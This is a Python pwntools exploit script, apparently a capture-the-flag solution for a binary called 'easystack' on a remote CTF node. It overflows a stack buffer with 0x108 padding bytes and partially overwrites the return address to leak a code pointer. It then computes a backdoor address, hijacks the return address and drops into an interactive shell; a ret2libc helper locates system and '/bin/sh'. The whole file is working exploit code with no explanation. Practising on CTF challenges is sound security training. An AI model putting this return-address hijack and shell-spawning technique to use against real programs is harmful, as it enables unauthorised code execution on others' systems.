#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
os_level = 64
binary_name = 'easystack'
remote_addr, port = 'node5.anna.nssctf.cn:22910'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    payload = b'a'*0x108
    payload += b'\x94'
    #dbg()
    sda('name?\n',payload)
    ru(b'\x94')
    main_1294_addr = u64(rc(5).ljust(7,b'\x00').rjust(8,b'\x00'))
    main_1294_addr |= 0x0000000000000094
    display('main_1294_addr', main_1294_addr)
    backdoor = main_1294_addr - 0x10f
    payload = b'a'*0x108 + p64(backdoor)
    sla(b'name?\n',payload)
    p.interactive()
